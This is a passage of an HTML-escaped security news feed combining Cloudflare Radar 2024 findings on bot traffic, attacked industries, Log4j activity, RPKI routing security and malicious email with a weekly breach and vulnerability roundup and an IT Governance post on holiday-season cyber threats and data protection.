href="https://radar.cloudflare.com/year-in-review/2024#bot-traffic-sources"&gt;&lt;u&gt;Globally&lt;/u&gt;&lt;/a&gt;, we found that 68.5% of observed bot traffic came from the top 10 countries in 2024, with the United States responsible for half of that total, over 5x the share of second place Germany. (In comparison to 2023, the US share was up slightly, while Germany’s was down slightly.) Among cloud platforms that originate bot traffic, Amazon Web Services was responsible for 12.7% of global bot traffic, and 7.8% came from Google. Microsoft, Hetzner, Digital Ocean, and OVH all also contributed more than a percent each.&lt;/p&gt;

            &lt;h3&gt;Globally, Gambling/Games was the most attacked industry, slightly ahead of 2023’s most targeted industry, Finance.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#globally-gambling-games-was-the-most-attacked-industry-slightly-ahead-of-2023s-most-targeted-industry-finance"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;The industries targeted by attacks often shift over time, depending on the intent of the attackers. They may be trying to cause financial harm by attacking ecommerce sites during a busy shopping period, gain an advantage against opponents by attacking an online game, or make a political statement by attacking government-related sites. To identify industry-targeted attack activity during 2024, we analyzed mitigated traffic for customers that had an associated industry and vertical within their customer record. Mitigated traffic was aggregated weekly by source country/region across 19 target industries.&lt;/p&gt;&lt;p&gt;Companies in the Gambling/Games industry were, in aggregate, the &lt;a href="https://radar.cloudflare.com/year-in-review/2024#most-attacked-industries"&gt;&lt;u&gt;most attacked during 2024&lt;/u&gt;&lt;/a&gt;, with 6.6% of global mitigated traffic targeting the industry. The industry was slightly ahead of Finance, which led 2023’s aggregate list. (Both industries are shown at 6.6% in the Summary view due to rounding.)  Gambling/Games sites saw the largest shares of mitigated traffic in January and the first week of February, possibly related to National Football League playoffs in the United States, heading into the &lt;a href="https://blog.cloudflare.com/super-bowl-lviii/"&gt;&lt;u&gt;Super Bowl&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;Attacks targeting Finance organizations were most active in May, reaching a peak of 15.3% of mitigated traffic the week of May 13. This is in line with the figure in our &lt;a href="https://radar.cloudflare.com/reports/ddos-2024-q2#id-9-top-attacked-industries"&gt;&lt;i&gt;&lt;u&gt;DDoS threat report for Q2 2024&lt;/u&gt;&lt;/i&gt;&lt;/a&gt; that shows that Financial Services was the most attacked industry by request volume during the quarter in South America and the Middle East region.&lt;/p&gt;&lt;p&gt;As we have seen in the past, peak attack activity varied by industry on a weekly basis. The highest peaks for the year were seen in attacks targeting People &amp;amp; Society organizations (19.6% of mitigated traffic, week of January 1), the Autos &amp;amp; Vehicles industry (29.7% of mitigated traffic, week of January 15), and the Real Estate industry (27.5% of mitigated traffic, week of August 26).&lt;/p&gt;

        &lt;p&gt;In December 2021, we published a &lt;a href="https://blog.cloudflare.com/tag/log4j/"&gt;&lt;u&gt;series of blog posts about the Log4j vulnerability&lt;/u&gt;&lt;/a&gt;, highlighting the threat that it posed, our observations of attempted exploitation, and the steps we took to protect customers. Two years on, in our &lt;a href="https://blog.cloudflare.com/radar-2023-year-in-review/"&gt;&lt;u&gt;2023 Year in Review&lt;/u&gt;&lt;/a&gt;, we &lt;a href="https://blog.cloudflare.com/radar-2023-year-in-review/#even-as-an-older-vulnerability-log4j-remained-a-top-target-for-attacks-during-2023-however-http-2-rapid-reset-emerged-as-a-significant-new-vulnerability-beginning-with-a-flurry-of-record-breaking-attacks"&gt;&lt;u&gt;noted&lt;/u&gt;&lt;/a&gt; that even as an older vulnerability, Log4j remained a top target for attacks during 2023, with related attack activity significantly higher than other commonly exploited vulnerabilities.&lt;/p&gt;&lt;p&gt;In 2024, three years after the initial Log4j disclosure, we found that Log4j remains an active threat. This year, we compared normalized daily attack activity for Log4j with attack activity for Atlassian Confluence Code Injection, a vulnerability we &lt;a href="https://radar.cloudflare.com/year-in-review/2023#commonly-exploited-vulnerabilities"&gt;&lt;u&gt;examined in the 2023 Year in Review&lt;/u&gt;&lt;/a&gt;, as well as aggregated daily attack activity for multiple &lt;a href="https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures"&gt;&lt;u&gt;CVEs&lt;/u&gt;&lt;/a&gt; related to &lt;a href="https://capec.mitre.org/data/definitions/115.html"&gt;&lt;u&gt;Authentication Bypass&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://www.cloudflare.com/en-gb/learning/security/what-is-remote-code-execution/"&gt;&lt;u&gt;Remote Code Execution&lt;/u&gt;&lt;/a&gt; vulnerabilities published in 2024.&lt;/p&gt;&lt;p&gt;&lt;a href="https://radar.cloudflare.com/year-in-review/2024#commonly-exploited-vulnerabilities"&gt;&lt;u&gt;Log4j attack activity&lt;/u&gt;&lt;/a&gt; appeared to trend generally upwards across the year, with several significant spikes visible during the first half of the year, and then again in October and November. In terms of the difference in activity, Log4j ranges from approximately 4x to over 20x the activity seen for Atlassian Confluence Code Injection, and as much as 100x the aggregated activity seen for Authentication Bypass or Remote Code Injection vulnerabilities.  &lt;/p&gt;

            &lt;h3&gt;Routing security, measured as the share of RPKI valid routes and the share of covered IP address space, continued to improve globally throughout 2024. &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#routing-security-measured-as-the-share-of-rpki-valid-routes-and-the-share-of-covered-ip-address-space-continued-to-improve-globally-throughout-2024"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;As the routing protocol that underpins the Internet, &lt;a href="https://www.cloudflare.com/learning/security/glossary/what-is-bgp/"&gt;&lt;u&gt;Border Gateway Protocol (BGP)&lt;/u&gt;&lt;/a&gt; communicates routes between networks, enabling traffic to flow between source and destination. BGP, however, relies on trust between networks, and incorrect information shared between peers, whether or not it was shared intentionally, can send traffic to the wrong place, potentially with &lt;a href="https://blog.cloudflare.com/bgp-leaks-and-crypto-currencies/"&gt;&lt;u&gt;malicious results&lt;/u&gt;&lt;/a&gt;. &lt;a href="https://blog.cloudflare.com/rpki/"&gt;&lt;u&gt;Resource Public Key Infrastructure (RPKI)&lt;/u&gt;&lt;/a&gt; is a cryptographic method of signing records that associate a BGP route announcement with the correct originating autonomous system (AS) number, providing a way of ensuring that the information being shared originally came from a network that is allowed to do so. (It is important to note that this is only half of the challenge of implementing routing security, because network providers also need to validate these signatures and filter out invalid announcements to prevent sharing them further.)&lt;/p&gt;&lt;p&gt;Cloudflare has long been an advocate for routing security, including being a founding participant in the &lt;a href="https://www.manrs.org/2020/03/new-category-of-cdns-and-cloud-providers-join-manrs-to-improve-routing-security/"&gt;&lt;u&gt;MANRS CDN and Cloud Programme&lt;/u&gt;&lt;/a&gt; and providing a &lt;a href="https://isbgpsafeyet.com/"&gt;&lt;u&gt;public tool&lt;/u&gt;&lt;/a&gt; that enables users to test whether their Internet provider has implemented BGP safely. Building on insights available in the &lt;a href="https://radar.cloudflare.com/routing"&gt;&lt;u&gt;Routing page&lt;/u&gt;&lt;/a&gt; on Cloudflare Radar, we analyzed data from &lt;a href="https://ftp.ripe.net/rpki/"&gt;&lt;u&gt;RIPE NCC's RPKI daily archive&lt;/u&gt;&lt;/a&gt; to determine the share of RPKI valid routes (as opposed to those route announcements that are &lt;a href="https://rpki.readthedocs.io/en/latest/about/help.html"&gt;&lt;u&gt;invalid or whose status is unknown&lt;/u&gt;&lt;/a&gt;) and how that share has changed over the course of 2024, as well as determining the share of IP address space covered by valid routes. The latter metric is of interest because a route announcement covering a significant amount of IP address space (millions of IPv4 addresses, for example) has a greater potential impact than an announcement covering a small block of IP address space (hundreds of IPv4 addresses, for example).&lt;/p&gt;&lt;p&gt;At a &lt;a href="https://radar.cloudflare.com/year-in-review/2024#routing-security"&gt;&lt;u&gt;global&lt;/u&gt;&lt;/a&gt; level during 2024, we saw a 6.4 percentage point increase (from 43.4% to 49.8%) in valid IPv4 routes, and a 3.2 percentage point increase (from 53.7% to 56.9%) in valid IPv6 routes. Given the trajectory, it is likely that over half of IPv4 routes will be RPKI valid by the end of calendar year 2024. Looking at the global share of IP address space covered by valid routes, we saw a 4.7 percentage point increase (from 38.9% to 43.6%) for IPv4, and a 3.3 percentage point increase (from 57.6% to 60.9%) for IPv6.&lt;/p&gt;

However, the share of valid routes grew significantly on February 15, when &lt;a href="https://radar.cloudflare.com/as12479"&gt;&lt;u&gt;AS12479 (Orange Espagne)&lt;/u&gt;&lt;/a&gt; signed records associated with 98% of their IP address prefixes that were previously in an &lt;a href="https://www.ripe.net/manage-ips-and-asns/resource-management/rpki/bgp-origin-validation/"&gt;&lt;u&gt;“unknown” (or NotFound) state of RPKI validity&lt;/u&gt;&lt;/a&gt;, thus converting these prefixes from unknown to valid. That drove an immediate increase for IPv4 to 76%, reaching 81% validity by December 1, and an immediate increase for IPv6 to 91%, reaching 92.9% validity by December 1. A notable change in covered IP address space was observed in &lt;a href="https://radar.cloudflare.com/year-in-review/2024/cm#routing-security"&gt;&lt;u&gt;Cameroon&lt;/u&gt;&lt;/a&gt;, where covered IPv4 space more than doubled at the end of January, growing from 32% to 82%. This was due to &lt;a href="https://radar.cloudflare.com/as36912"&gt;&lt;u&gt;AS36912 (Orange Cameroun)&lt;/u&gt;&lt;/a&gt; signing records associated with all of their IPv4 address prefixes, changing the associated IP address space to RPKI valid. &lt;/p&gt;

          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h3&gt;An average of 4.3% of emails were determined to be malicious in 2024. &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#an-average-of-4-3-of-emails-were-determined-to-be-malicious-in-2024"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Despite the growing enterprise use of collaboration/messaging apps, email remains an important business application and is a very attractive entry point into enterprise networks for attackers. Attackers will send targeted malicious emails that attempt to impersonate an otherwise legitimate sender (such as a corporate executive), that try to get the user to click on a deceptive link, or that contain a dangerous attachment, among other types of threats. &lt;a href="https://www.cloudflare.com/zero-trust/products/email-security/"&gt;&lt;u&gt;Cloudflare Email Security&lt;/u&gt;&lt;/a&gt; protects customers from email-based attacks, including those carried out through targeted malicious email messages. During&lt;a href="https://radar.cloudflare.com/year-in-review/2024#malicious-emails"&gt;&lt;u&gt; 2024&lt;/u&gt;&lt;/a&gt;, an average of 4.3% of emails analyzed by Cloudflare were found to be malicious. Aggregated at a weekly level, spikes above 14% were seen in late March, early April, and mid-May. We believe that these spikes were related to targeted “backscatter” attacks, where the attacker flooded a target with undeliverable messages, which then bounced the messages to the victim, whose email had been set as the reply-to: address.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/693EaEyePShBH8CZ7cZWv1/c08e0acd6f8a6a15b730b1cd90bf6283/email_-_malicious_worldwide.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Global malicious email share trends in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Deceptive links and identity deception were the two most common types of threats found in malicious email messages. &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#deceptive-links-and-identity-deception-were-the-two-most-common-types-of-threats-found-in-malicious-email-messages"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Attackers use a variety of techniques, which we refer to as threat categories, when they use malicious email messages as an attack vector. These categories are defined and explored in detail in our &lt;a href="https://blog.cloudflare.com/2023-phishing-report/"&gt;&lt;u&gt;phishing threats report&lt;/u&gt;&lt;/a&gt;. In our analysis of malicious emails, we have found that such messages may contain multiple types of threats. In reviewing a weekly aggregation of threat activity trends for these categories, we found that, &lt;a href="https://radar.cloudflare.com/year-in-review/2024#top-email-threats"&gt;&lt;u&gt;averaged across 2024&lt;/u&gt;&lt;/a&gt;, 42.9% of malicious email messages contained deceptive links, with the share reaching 70% at times throughout the year. Activity for this thread category was spiky, with low points seen in the March to May timeframe, and a general downward trend visible from July through November.&lt;/p&gt;&lt;p&gt;Identity deception was a similarly active threat category, with such threats also found in up to 70% of analyzed emails several weeks throughout the year. Averaged across 2024, 35.1% of emails contained attempted identity deception. The activity pattern for this threat category appears to be somewhat similar to deceptive links, with a number of the peaks and valleys occurring during the same weeks. At times, identity deception was a more prevalent threat in analyzed emails than deceptive links, as seen in the graph below.&lt;/p&gt;&lt;p&gt;Among other threat categories, extortion saw the most significant change throughout the year. After being found in 86% of malicious emails during the first week of January, its share gradually trended lower throughout the year, finishing November under 10%.&lt;/p&gt;
          &lt;figure&gt;

            &lt;h3&gt;Over 99% of the email messages processed by Cloudflare Email Security from the .bar, .rest, and .uno top level domains (TLDs) were found to be either spam or malicious in nature.&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#over-99-of-the-email-messages-processed-by-cloudflare-email-security-from-the-bar-rest-and-uno-top-level-domains-tlds-were-found-to-be-either-spam-or-malicious-in-nature"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;In March 2024, we &lt;a href="https://blog.cloudflare.com/email-security-insights-on-cloudflare-radar/"&gt;&lt;u&gt;launched a set of email security insights on Cloudflare Radar&lt;/u&gt;&lt;/a&gt;, including visibility into so-called “dangerous domains” — those top level domains (TLDs) that were found to be the sources of the most spam or malicious email among messages analyzed by Cloudflare Email Security. The analysis is based on the sending domain’s TLD, found in the &lt;code&gt;From&lt;/code&gt;: header of an email message. For example, if a message came from &lt;code&gt;sender@example.com&lt;/code&gt;, then &lt;code&gt;example.com&lt;/code&gt; is the sending domain, and .com is the associated TLD.&lt;/p&gt;&lt;p&gt;&lt;a href="https://radar.cloudflare.com/year-in-review/2024#most-observed-tlds"&gt;&lt;u&gt;In aggregate across 2024&lt;/u&gt;&lt;/a&gt;, we found that the &lt;a href="https://icannwiki.org/.bar"&gt;&lt;code&gt;&lt;u&gt;.bar&lt;/u&gt;&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://icannwiki.org/.rest"&gt;&lt;code&gt;&lt;u&gt;.rest&lt;/u&gt;&lt;/code&gt;&lt;/a&gt;, and &lt;a href="https://icannwiki.org/.uno"&gt;&lt;code&gt;&lt;u&gt;.uno&lt;/u&gt;&lt;/code&gt;&lt;/a&gt; TLDs were the “most dangerous”, each with over 99% of analyzed email messages characterized as either spam or malicious. (These TLDs are all at least a decade old, and each sees at least some usage, with &lt;a href="https://research.domaintools.com/statistics/tld-counts/"&gt;&lt;u&gt;between 20,000 and 60,000 registered domain names&lt;/u&gt;&lt;/a&gt;.)  Sorting by malicious email share, the &lt;a href="https://icannwiki.org/.ws"&gt;&lt;code&gt;&lt;u&gt;.ws&lt;/u&gt;&lt;/code&gt;&lt;/a&gt; ccTLD (country code top level domain) belonging to Western Samoa came out on top, with over 90% of analyzed emails categorized as malicious. Sorting by spam email share, &lt;a href="https://icannwiki.org/.quest"&gt;&lt;code&gt;&lt;u&gt;.quest&lt;/u&gt;&lt;/code&gt;&lt;/a&gt; is the biggest offender, with over 88% of emails originating from associated domains characterized as spam.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;TOP ATTACKS AND BREACHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Romania&amp;#8217;s Constitutional Court annulled the first round of its presidential election after declassified intelligence revealed Russian interference favoring right wing candidate Călin Georgescu. The interference &lt;a href="https://www.bbc.com/news/articles/cgq18w507dko"&gt;involved&lt;/a&gt; a sophisticated social media campaign on TikTok, with $381,000 spent to promote Georgescu without proper disclosure, and cyberattacks targeting electoral infrastructure, leading to vote recounts. The annulment has postponed the runoff election.&lt;/li&gt;
&lt;li&gt;Brain Cipher ransomware group, which payloads are based on LockBit 3.0, &lt;a href="https://www.infosecurity-magazine.com/news/deloitte-denies-breach-claims/"&gt;claimed&lt;/a&gt; responsibility for a breach of Deloitte UK&amp;#8217;s systems, alleging the theft of 1TB of compressed data, including sensitive information. Deloitte has denied the claims, asserting that the attack likely involved a single client&amp;#8217;s system external to Deloitte&amp;#8217;s network.&lt;/li&gt;
&lt;/ul&gt;

&lt;ul&gt;
&lt;li&gt;Refinadora Costarricense de Petróleo (RECOPE), Costa Rica&amp;#8217;s state-owned entity overseeing the fuel supply chain, &lt;a href="https://therecord.media/costa-rica-state-energy-company-ransomware"&gt;suffered&lt;/a&gt; a ransomware attack detected in November. This forced the company to switch to manual operations, disrupting digital payment systems and complicating fuel distribution. Despite these challenges, RECOPE assured the public of sufficient fuel reserves.&lt;/li&gt;
&lt;li&gt;ENGlobal Corporation, an energy industry contractor for the US government, &lt;a href="https://www.securityweek.com/energy-sector-contractor-englobal-targeted-in-ransomware-attack/"&gt;reported&lt;/a&gt; a ransomware attack discovered in November, which led to the encryption of certain data files and limited access to its IT systems. Currently, no ransomware group has claimed responsibility for the attack, and the potential impact on financial performance is under assessment.&lt;/li&gt;
&lt;li&gt;Conferencing division of the telecommunication giant BT Group has &lt;a href="https://www.theregister.com/2024/12/05/bt_group_confirms_attempted_attack/"&gt;experienced&lt;/a&gt; an attempted ransomware attack. It was claimed by the Black Basta group that they have stolen approximately 500 GB of data, including financial records, non-disclosure agreements, and personal documents.&lt;/li&gt;
&lt;/ul&gt;

&lt;li&gt;Ukrainian intelligence agency HUR &lt;a href="https://kyivindependent.com/hur-gazprombank-cyberattack/"&gt;confirmed&lt;/a&gt; executing a DDoS against Russia’s Gazprombank, one of Russia’s largest banks. This led to users experiencing difficulties accessing services, an interference aimed to disrupt financial operations tied to Russia&amp;#8217;s war efforts in Ukraine.&lt;/li&gt;
&lt;li&gt;Stoli Group USA has &lt;a href="https://therecord.media/stoli-group-usa-bankruptcy-filing-ransomware"&gt;filed&lt;/a&gt; for Chapter 11 bankruptcy after an August 2024 ransomware attack severely disrupted its IT infrastructure, forcing manual operations and hindering financial reporting. The company faces approximately $84 million in debt, with systems expected to be fully restored no earlier than the first quarter of 2025.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;VULNERABILITIES AND PATCHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A newly discovered zero-day vulnerability in Windows &lt;a href="https://blog.0patch.com/2024/12/url-file-ntlm-hash-disclosure.html"&gt;allows&lt;/a&gt; attackers to capture NTLM credentials by having the user view a malicious file in Windows Explorer. This flaw affects all Windows versions from Windows 7 and Server 2008 R2 up to the latest Windows 11 24H2 and Server 2022. While Microsoft has yet to release an official fix, the 0patch platform has shared an unofficial micropatch.&lt;/li&gt;
&lt;li&gt;A critical remote code execution vulnerability (CVE-2024-8785) in Progress WhatsUp Gold versions 2023.1.0 and earlier, &lt;a href="https://www.bleepingcomputer.com/news/security/exploit-released-for-critical-whatsup-gold-rce-flaw-patch-now/"&gt;enables&lt;/a&gt; unauthenticated attackers to modify Windows registry keys, potentially leading to arbitrary code execution. With a proof-of-concept (PoC) exploit now published, administrators are strongly urged to update to version 24.0.1 to mitigate this risk.&lt;/li&gt;
&lt;li&gt;Veeam has &lt;a href="https://www.veeam.com/kb4679"&gt;released&lt;/a&gt; security updates to fix two vulnerabilities in its Service Provider Console (VSPC), including a critical remote code execution flaw (CVE-2024-42448) with a severity score of 9.9 out of 10. This vulnerability allows attackers to execute arbitrary code on unpatched servers via the VSPC management agent. Another high-severity flaw (CVE-2024-42449) enables attackers to steal NTLM hashes and delete files on the VSPC server.&lt;/li&gt;
&lt;/ul&gt;

&lt;ul&gt;
&lt;li&gt;Check Point Research &lt;a href="https://research.checkpoint.com/2024/inside-akira-ransomwares-rust-experiment/"&gt;analyzed&lt;/a&gt; the design and control flow of Akira ransomware&amp;#8217;s latest variant, written in Rust, that has been primarily targeting ESXi bare metal hypervisor servers in early 2024. The report analyses the unique features of this version of the ransomware, showing how Rust idioms, boilerplate code, and compiler strategies have been used to create complex assembly.&lt;/li&gt;

The attacks have enabled the Chinese state affiliated group to exfiltrate extensive metadata and the interception of call audio and text messages, particularly targeting individuals linked to the U.S. government.&lt;/li&gt;
&lt;li&gt;Researchers have &lt;a href="https://www.security.com/threat-intelligence/us-china-espionage"&gt;uncovered&lt;/a&gt; a cyber intrusion targeting a U.S. organization in China, attributed to a China-based threat actor. The attackers used DLL-sideloading with legitimate applications and tools like Impacket, FileZilla, and PowerShell to exfiltrate data and emails. Multiple computers were compromised over the four-month campaign.&lt;/li&gt;
&lt;li&gt;Researchers &lt;a href="https://www.microsoft.com/en-us/security/blog/2024/12/04/frequent-freeloader-part-i-secret-blizzard-compromising-storm-0156-infrastructure-for-espionage/"&gt;report&lt;/a&gt; on Russian nation-state actor known as Secret Blizzard (Turla) leveraging the infrastructure of six other threat actors, both state-sponsored and cybercriminals, for facilitating their espionage operations. The actor has particularly targeted the infrastructure used by other threat actors to deploy backdoors and gather intelligence on targets, notably in South Asia.&lt;/li&gt;

&lt;p&gt;The post &lt;a href="https://www.itgovernance.co.uk/blog/cyber-threats-during-the-holidays-how-to-stay-safe-from-seasonal-scams-and-data-breaches"&gt;Cyber Threats During the Holidays: How to Stay Safe From Seasonal Scams and Data Breaches&lt;/a&gt; appeared first on &lt;a href="https://www.itgovernance.co.uk/blog"&gt;IT Governance UK Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;As the year draws to a close, let’s look at:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;What were some of the biggest breaches in 2024?&lt;/li&gt;



&lt;li&gt;What threats should you be aware of this Christmas?&lt;/li&gt;



&lt;li&gt;How can organisations stay safe during the festive season?&lt;/li&gt;
&lt;/ul&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;3 major data breaches from 2024&lt;/h2&gt;



&lt;p&gt;COMBs (compilations of many breaches) aside – like the &lt;a href="https://www.itgovernance.co.uk/blog/mother-of-all-breaches-26-billion-records-leaked" rel="noreferrer noopener" target="_blank"&gt;MOAB (mother of all breaches)&lt;/a&gt; in January 2024, which leaked more than 26 &lt;em&gt;billion &lt;/em&gt;records – let’s look at three major breaches from 2024:&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;1. National Public data breach&lt;/h3&gt;



&lt;p&gt;In August 2024, NPD (National Public Data) &lt;a href="https://nypost.com/2024/08/19/business/national-public-data-admits-hackers-stole-social-security-numbers/" rel="noreferrer noopener" target="_blank"&gt;confirmed&lt;/a&gt; a breach that compromised sensitive information, including Social Security numbers, affecting nearly all Americans.&lt;/p&gt;



&lt;p&gt;The breach was linked to unauthorised access attempts in December 2023 and potential data leaks in April and summer 2024.&lt;/p&gt;



&lt;p&gt;Personal data of up to 2.9 billion individuals was reportedly posted on the dark web for $3.5 million (about £2.8 million).&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;2. Ticketmaster data breach&lt;/h3&gt;



&lt;p&gt;In May 2024, Ticketmaster, a subsidiary of Live Nation, &lt;a href="https://time.com/6984811/ticketmaster-data-breach-customers-livenation-everything-to-know/" rel="noreferrer noopener" target="_blank"&gt;experienced&lt;/a&gt; a significant data breach, apparently affecting 560 million users.&lt;/p&gt;



&lt;p&gt;The threat actor ShinyHunters claimed responsibility, offering 1.3 TB of customer data, including &lt;a href="https://www.itgovernance.co.uk/blog/the-gdpr-do-you-know-the-difference-between-personal-data-and-sensitive-data" rel="noreferrer noopener" target="_blank"&gt;personal data&lt;/a&gt; and credit card details, for sale on the dark web.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;3. Internet Archive data breach&lt;/h3&gt;



&lt;p&gt;In October 2024, the Internet Archive, including its Wayback Machine, &lt;a href="https://www.thesun.ie/news/13986599/internet-archive-data-breach-wayback-machine-hacking-impact-users/" rel="noreferrer noopener" target="_blank"&gt;suffered&lt;/a&gt; a cyber attack that exposed data of potentially 31 million users.&lt;/p&gt;



&lt;p&gt;The breach involved a malicious JavaScript pop-up that directed users to check compromised email addresses and passwords.&lt;/p&gt;



&lt;p&gt;Exposed data included email addresses, usernames and bcrypt password hashes.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;3 threats organisations face during the holiday season&lt;/h2&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;1. Ransomware attacks&lt;/h3&gt;



&lt;p&gt;During the holiday period, cyber criminals know that many organisations have fewer staff available, and potentially more lax security. This can lead to increased ransomware incidents, as illustrated by &lt;a href="https://therecord.media/cyberattack-on-massachusetts-hospital-disrupted-health-record-system" rel="noreferrer noopener" target="_blank"&gt;last year’s holiday season&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;&lt;a href="https://www.itgovernance.co.uk/blog/worrying-ransomware-trends-and-what-to-do-about-them" rel="noreferrer noopener" target="_blank"&gt;Today’s ransomware&lt;/a&gt; doesn’t just &lt;em&gt;encrypt&lt;/em&gt; data – it often &lt;em&gt;exfiltrates&lt;/em&gt; data, too.&lt;/p&gt;



&lt;p&gt;Threat actors exploit a range of vulnerabilities for this, including:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Weak passwords;&lt;/li&gt;



&lt;li&gt;Unpatched systems;&lt;/li&gt;



&lt;li&gt;Zero-day vulnerabilities; and&lt;/li&gt;



&lt;li&gt;Insecure remote access solutions.&lt;/li&gt;
&lt;/ul&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;2. DoS (denial-of-service) attacks&lt;/h3&gt;



&lt;p&gt;Retailers and e-commerce platforms are particularly vulnerable to DoS attacks during peak shopping times, aiming to disrupt services and cause financial losses.&lt;/p&gt;



&lt;p&gt;A DoS attack involves a cyber attacker flooding your servers with requests such that they can’t cope. That can result in your website, emails and other services going down, depending on the server targeted.&lt;/p&gt;



&lt;p&gt;Platforms may also be targeted by a DDoS (distributed denial-of-service) attack. This is a variant of a DoS attack, with the key difference that DDoS attacks involve multiple machines attacking the target.&lt;/p&gt;



&lt;p&gt;(With a DoS attack, just one computer is attacking the server.)&lt;/p&gt;



&lt;p&gt;Attackers may also launch a DoS attack to distract you from a different attack – ransomware, for example.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;3. Phishing and social engineering&lt;/h3&gt;



&lt;p&gt;Phishing and social engineering attacks invariably rise during the holidays, targeting both consumers and employees.&lt;/p&gt;



&lt;p&gt;Common holiday scams include:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Fake delivery notifications;&lt;/li&gt;



&lt;li&gt;Fake charities requesting donations;&lt;/li&gt;



&lt;li&gt;Fraudulent vacation offers and rentals;&lt;/li&gt;



&lt;li&gt;Social media scams – impersonated brands and fake giveaways; and&lt;/li&gt;



&lt;li&gt;Fake shopping sites with urgent deals and too-good-to-be-true offers.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;With more staff out of office, threat actors may also impersonate an employee, asking a ‘colleague’ to take action on their behalf.&lt;/p&gt;



&lt;p&gt;Such emails often contain a sense of urgency, or try to manipulate you in another way. Don’t forget: social engineering is all about exploiting your psychology.&lt;/p&gt;



&lt;p&gt;As our penetration tester Hilmi Tin explained in &lt;a href="https://www.itgovernance.co.uk/blog/meet-the-hacker-how-simulated-phishing-addresses-your-biggest-security-risk#What-is-simulated-phishing" rel="noreferrer noopener" target="_blank"&gt;this interview&lt;/a&gt;, attackers take advantage of the fact we’re curious, or make clever use of fear tactics.&lt;/p&gt;



&lt;p&gt;He also recommends simply taking ten seconds to look out for warning signs – particularly if the message is unexpected and making you feel like you need to do something.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;How to protect your sensitive data&lt;/h2&gt;



&lt;p&gt;To protect your sensitive data – including personal data – make sure you’re clear on:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;What data you hold;&lt;/li&gt;



&lt;li&gt;Where it’s stored; and&lt;/li&gt;



&lt;li&gt;Who can access that data.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Tools like data inventories, &lt;a href="https://www.itgovernance.co.uk/blog/streamlining-gdpr-compliance-with-ropas-data-flow-maps-and-dpias#Data-flow-mapping" rel="noreferrer noopener" target="_blank"&gt;data flow maps&lt;/a&gt; and &lt;a href="https://www.itgovernance.co.uk/blog/records-of-processing-activities-ropas-simplifying-gdpr-compliance" rel="noreferrer noopener" target="_blank"&gt;ROPAs (records of processing activities)&lt;/a&gt; will help with this. Ideally, these also highlight the technical and/or organisational measures in place to process and secure that data, as required by the &lt;a href="https://www.itgovernance.co.uk/data-protection-dpa-and-eu-data-protection-regulation" rel="noreferrer noopener" target="_blank"&gt;GDPR (General Data Protection Regulation)&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;Other tools like &lt;a href="https://www.itgovernance.co.uk/blog/streamlining-gdpr-compliance-with-ropas-data-flow-maps-and-dpias#Data-protection-impact-assessment" rel="noreferrer noopener" target="_blank"&gt;DPIAs (data protection impact assessments)&lt;/a&gt; also provide valuable information, making it easier to understand your data, so you can better &lt;a href="https://www.itgovernance.co.uk/blog/how-do-you-mitigate-information-security-risk" rel="noreferrer noopener" target="_blank"&gt;manage your risks&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;Up-to-date policies and procedures will also improve your cyber security and privacy stance, and ensure you’re ready to deal with any threats.&lt;/p&gt;



